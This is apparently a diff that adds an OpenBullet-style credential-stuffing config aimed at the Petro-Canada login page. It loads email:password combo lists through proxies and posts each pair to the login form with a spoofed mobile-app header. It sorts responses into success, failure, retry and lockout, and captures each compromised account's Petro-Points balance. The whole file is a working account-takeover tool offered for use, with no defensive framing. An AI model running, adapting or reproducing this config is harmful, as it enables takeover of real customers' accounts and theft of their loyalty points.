@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "PETRO CANDA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T13:46:36.237776+00:00",
+  "AdditionalInfo": "",
+  "Author": "KAATIL",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://app.petro-canada.ca/en/login.aspx?app" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://app.petro-canada.ca/en/login.aspx?app" 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTg1NDkxNjIzNg9kFgICAQ9kFgICBQ8WAh4Kb25rZXlwcmVzcwUxcmV0dXJuIGNoZWNrRW50ZXJLZXkoIGV2ZW50LCAnaWQzNTFfYnRuU3VibWl0JyApOxYGAgEPZBYCZg8WAh4EVGV4dAXZCTx1bCB4bWxuczpQZXRyby1DYW5hZGE9Imh0dHA6Ly93d3cucGV0cm8tY2FuYWRhLmNhIj4NCiAgPGEgaWQ9ImxvZ2luIiBocmVmPSIvZW4vbG9naW4uYXNweCI%2BDQogICAgPGxpPkxvZ2luPC9saT4NCiAgPC9hPg0KICA8YSBocmVmPSIvZW4vcmVnaXN0ZXIuYXNweD9tPWpvaW4iPg0KICAgIDxsaT5Kb2luIFBldHJvLVBvaW50czwvbGk%2BDQogIDwvYT4NCiAgPGEgaHJlZj0iL2VuL215LWFjY291bnQuYXNweCI%2BDQogICAgPGxpPk15IEFjY291bnQ8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9zdGF0aW9uLWxvY2F0b3IuYXNweCI%2BDQogICAgPGxpPkZpbmQgYSBHYXMgU3RhdGlvbjwvbGk%2BDQogIDwvYT4NCiAgPGEgaHJlZj0iL2VuL3JlZ2lzdGVyLmFzcHgiPg0KICAgIDxsaT5BY3RpdmF0ZSBQZXRyby1Qb2ludHM8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9yZWxvYWQtY3djLmFzcHgiPg0KICAgIDxsaT5SZWxvYWQgQ2FyIFdhc2ggQ2FyZHM8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9yZWdpc3Rlci1jYXJkLmFzcHgiPg0KICAgIDxsaT5SZWdpc3RlciBQZXRyby1DYW5hZGEgQ2FyZHM8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9saW5rLXBhcnRuZXItY2FyZC5hc3B4Ij4NCiAgICA8bGk%2BTGluayBZb3VyIFBhcnRuZXIgQ2FyZHM8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9yZXBsYWNlLWN3Yy5hc3B4Ij4NCiAgICA8bGk%2BUmVwbGFjZSBDYXIgV2FzaCBDYXJkPC9saT4NCiAgPC9hPg0KICA8YSBocmVmPSIvZW4vcmVsb2FkLWZzci5hc3B4Ij4NCiAgICA8bGk%2BUmVsb2FkIEZ1ZWwgU2F2aW5ncyBDYXJkPC9saT4NCiAgPC9hPg0KICA8YSBocmVmPSIvZW4vcGV0cm8tcG9pbnRzLXJld2FyZHMuYXNweCI%2BDQogICAgPGxpPlBldHJvLVBvaW50cyBSZXdhcmRzPC9saT4NCiAgPC9hPg0KICA8YSBocmVmPSIvZW4vaG93LXRvLWVhcm4tbW9yZS1wb2ludHMuYXNweCI%2BDQogICAgPGxpPkVhcm4gTW9yZSBQb2ludHM8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9ob3ctdG8tc2F2ZS1vbi1mdWVsLmFzcHgiPg0KICAgIDxsaT5TYXZlIG9uIEZ1ZWw8L2xpPg0KICA8L2E%2BDQogIDxhIGhyZWY9Ii9lbi9zcGVjaWFsLW9mZmVycy5hc3B4Ij4NCiAgICA8bGk%2BU3BlY2lhbCBPZmZlcnM8L2xpPg0KICA8L2E%2BDQo8L3VsPg0KPGJyIHN0eWxlPSJjbGVhcjpib3RoOyIgeG1sbnM6UGV0cm8tQ2FuYWRhPSJodHRwOi8vd3d3LnBldHJvLWNhbmFkYS5jYSI%2BZAIED2QWCgIBDw8WAh4SRW5hYmxlQ2xpZW50U2NyaXB0aGRkAgIPDxYCHwJoZGQCBA8PFgIfAmhkZAIGDw8WAh4HVmlzaWJsZWhkFgQCAQ8PFgIfAmhkZAIDD2QWBGYPFgIfAQUPaWQzNTFfYnRuU3VibWl0ZAIBDxYCHwEFIl9fZG9Qb3N0QmFjaygnaWQzNTEkYnRuU3VibWl0JywnJylkAggPDxYCHwJoZGQCBQ9kFgJmD2QWAmYPZBYEAgEPDxYCHgtOYXZpZ2F0ZVVybAUSL2ZyL2xvZ2luLmFzcHg%2FYXBwZGQCAw8PFgIfA2hkZGQEqO0MqCPB2yxvReTbImZ04O5FYQ%3D%3D&__EVENTVALIDATION=%2FwEWBALE2Yr2BwKY%2BqbUCgK1yuS1AwK3t92yB%2FBLiyNLeqsEbE2x%2F7jX4ehB9USa&id351%24txtEmail=<USER>&id351%24txtPassword=<PASS>&id351%24btnSubmit=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://app.petro-canada.ca" 
+  HEADER "Referer: https://app.petro-canada.ca/en/login.aspx?app" 
+  HEADER "X-Requested-With: com.petrocanada.my_petro_canada" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The username/password combination is incorrect" 
+  KEYCHAIN Retry OR 
+    KEY "The requested URL was rejected" 
+  KEYCHAIN Success OR 
+    KEY "View Statement" 
+  KEYCHAIN Ban OR 
+    KEY "Your account is locked" 
+
+PARSE "<SOURCE>" LR "<strong><nobr>" "</nobr> Petro-Points" -> CAP "POINTS" 
+
